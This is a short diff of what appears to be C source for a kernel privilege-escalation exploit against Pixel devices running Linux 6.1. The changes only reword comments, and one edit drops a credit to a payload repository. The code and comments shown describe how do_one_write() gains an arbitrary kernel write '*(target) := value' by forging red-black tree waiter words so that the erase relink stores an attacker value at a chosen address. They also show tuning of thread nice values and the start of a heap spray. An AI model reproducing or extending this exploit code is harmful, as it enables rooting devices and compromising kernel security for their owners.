@@ -266,8 +266,8 @@ void *consumer_thread(void *arg __attribute__((unused))) {
         atomic_fetch_add(&consumer_calls, 1);
         atomic_store(&consumer_inflight, 1);
         errno = 0;
-        /* dynamic nice from Root-My-Pixel-Payloads src/61: (calls%19)+1 is proven to make
-         * sched_setattr succeed on 6.1 compact. */
+        /* rotate the nice every call; (calls%19)+1 is what makes
+         * sched_setattr succeed on 6.1 compact */
         int consumer_nice = (active_offsets && active_offsets->compact_waiter)
                                 ? (calls_this_seq % 19) + 1
                                 : PSELECT_CONSUMER_NICE;
@@ -332,11 +332,9 @@ int run_main_route_threads(void) {
 
 static int do_one_write(uintptr_t target, const char *desc, int mode, int leaf) {
   pr_info("=== %s === target=0x%016zx mode=%d leaf=%d\n", desc, target, mode, leaf);
-  /* Both transports deliver *(target) := value via the erase's left-only
-   * relink: the consumed waiter words are {pi pc = value, rb_right = 0,
-   * rb_left = target}, so __rb_erase_augmented() stores the pc word into
-   * *(rb_left); the node is RED (even pc) so no color fixup follows.
-   * leaf=1 is just the value=0 payload (fake_right=0). */
+  /* Both transports write *(target) := value through the erase left-only
+   * relink: waiter words are {pc = value, right = 0, left = target} and
+   * the node is RED so no color fixup runs. leaf=1 is the value=0 payload. */
   pselect_child_node = leaf ? 0 : 1;
   set_pselect_write_mode(target, mode);
   TIMER("  heap spray start");
